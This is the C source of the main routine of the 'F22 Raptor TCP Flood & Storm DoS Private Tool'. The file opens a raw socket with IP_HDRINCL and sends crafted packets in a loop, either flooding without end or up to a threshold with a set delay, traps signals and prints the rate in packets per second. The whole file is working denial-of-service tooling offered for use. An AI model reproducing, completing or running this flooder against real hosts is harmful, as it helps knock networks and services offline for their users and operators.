/* 
 * $Id: f22.c,v 1.4 2009-08-16 14:17:54-03 nbrito Exp $
 *
 * Author: Nelson Brito <nbrito@sekure.org>
 *
 * Copyright© 2004-2009 Nelson Brito.
 * This file is part of F22 Raptor TCP Flood & Storm DoS Private Tool.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.
 
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef F22_C__
#define F22_C__ 1

#include <common.h>

/* Statistics metrics. */
struct statistic s = {
	0,      /* execution time in seconds */
	0,      /* execution time in minutes */
	0,      /* execution time in hours   */
	0,      /* amount of packets         */
	{0, 0}, /* time start (sec & usec)   */
	{0, 0}  /* time stop (sec & usec)    */
};

/* Function Name: Main routine.

   Description:   This is the main function that calls other function to perform the
                  tasks.

   Targets:       N/A */
int main(int argc, char **argv){
	register int32_t sock;        /* socket                        */
	u_int32_t        on = 1;      /* status                        */
	/* Getting CLI options.                                        */
	struct options   o  = process_options(argc, argv);

	/* Setting RAW socket. */
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
#ifdef  __HAVE_DEBUG__
		printf("function %s in file %s (line %d)\n",
				__FUNCTION__,
				__FILE__,
				(__LINE__ - 6));
#endif  /* __HAVE_DEBUG__ */
		perror("socket()");
		exit(EXIT_FAILURE);
	}

	/* Setting IP_HDRINCL. */
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (int8_t *)&on, sizeof(on)) < 0){
#ifdef  __HAVE_DEBUG__
					printf("function %s in file %s (line %d)\n",
						__FUNCTION__,
						__FILE__,
						(__LINE__ - 6));
#endif  /* __HAVE_DEBUG__ */
		perror("setsockopt()");
		exit(EXIT_FAILURE);
	}

	/* Warning FLOOD mode and holding signals. */
	if(o.flood){
		printf("hit Ctrl+C (^C) to stop\n");
		signal(SIGHUP,  SIG_IGN);
		signal(SIGKILL, ctrlc);
		signal(SIGINT,  ctrlc);
		signal(SIGTERM, ctrlc);
		signal(SIGQUIT, ctrlc);
		signal(SIGABRT, ctrlc);
		signal(SIGSTOP, ctrlc);
		signal(SIGSEGV, ctrlc);
	}

	/* Starting time couting. */
	gettimeofday(&s.start, (struct timezone *)0);

	/* Execute if flood or while number. */
	while(o.flood || o.threshold--){
		
		/* Sending packets. */
		if((sendraw(sock, o)) == -1){
#ifdef  __HAVE_DEBUG__
					printf("function %s in file %s (line %d)\n",
						__FUNCTION__,
						__FILE__,
						(__LINE__ - 6));
#endif  /* __HAVE_DEBUG__ */
			perror("sendto()");
			close(sock);
			exit(EXIT_FAILURE);
		}

		/* Setting delay. */
		if(o.delay)
			usleep(o.delay * 1000);

		/* Counting bytes sent. */
		s.packets++;
	}

	/* Closing the socket. */
	close(sock);

	nb(done, 10000);

	return(EXIT_SUCCESS);
}

/* Function Name: Control-C routine.

   Description:   N/A

   Targets:       N/A */
void ctrlc(int32_t signal){
	/* Holding SIGSEGV. */
	if(signal == SIGSEGV){
#ifdef  __HAVE_DEBUG__
		printf("function %s in file %s (line %d)\n",
			__FUNCTION__,
			__FILE__,
			(__LINE__ - 6));
#endif  /* __HAVE_DEBUG__ */
		printf("SIGSEGV: fix me\n");
		exit(EXIT_FAILURE);
	}

	/* Stoping time couting. */
        gettimeofday(&s.stop, (struct timezone *)0);

	/* Computing execution time in seconds. */
        s.seconds = (s.stop.tv_sec - s.start.tv_sec)\
		+ (s.stop.tv_usec - s.start.tv_usec)/1000000.0;

        /* Printing statistics. */ 
        printf("\ninjected %i packets in %.2f sec (rating @ %.2f pps)\n\n",\
		s.packets, s.seconds,\
		(s.packets / s.seconds));
	/* Exiting. */
	exit(EXIT_SUCCESS);
}
#endif  /* F22_C__ */
